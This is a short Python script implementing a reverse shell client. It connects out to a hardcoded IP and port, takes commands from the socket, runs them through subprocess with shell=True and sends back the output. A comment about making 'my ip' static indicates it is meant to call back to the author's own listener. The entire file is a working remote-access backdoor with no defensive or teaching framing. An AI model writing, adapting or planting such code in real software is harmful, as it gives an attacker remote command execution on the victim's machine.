import socket
import os
import subprocess

IP = '127.0.0.1'  # TODO: make my ip static!!
PORT = 8778


def main():
    main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    main_socket.connect((IP, PORT))
    try:
        while True:
            cwd = os.getcwd()
            main_socket.sendall((cwd + '>').encode())
            # wait for command:
            command = main_socket.recv(1024).decode()
            # execute command:
            split_command = command.split(" ")
            # Shell=true gives us additional shell privileges
            output = subprocess.Popen(split_command, stdout=subprocess.PIPE, shell=True).communicate()[0]
            main_socket.sendall(output)
    except KeyboardInterrupt:
        main_socket.close()


if __name__ == '__main__':
    main()